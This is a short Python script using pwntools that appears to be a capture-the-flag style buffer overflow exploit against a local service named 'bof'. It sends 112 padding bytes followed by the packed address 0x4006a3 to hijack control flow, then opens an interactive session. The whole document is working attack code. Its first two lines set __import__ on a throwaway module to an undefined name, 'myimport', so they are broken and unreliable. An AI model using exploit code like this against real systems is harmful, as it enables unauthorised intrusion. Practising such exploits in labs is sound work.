import types
types.ModuleType('__builtin__').__dict__['__import__'] = myimport

from pwn import *

context.log_level = 'debug'

# p = process('./bof')
p = remote('127.0.0.1', 9999)

payload = ''
payload += 'A' * 112
payload += p64(0x4006a3)

p.sendline(payload)
p.interactive()
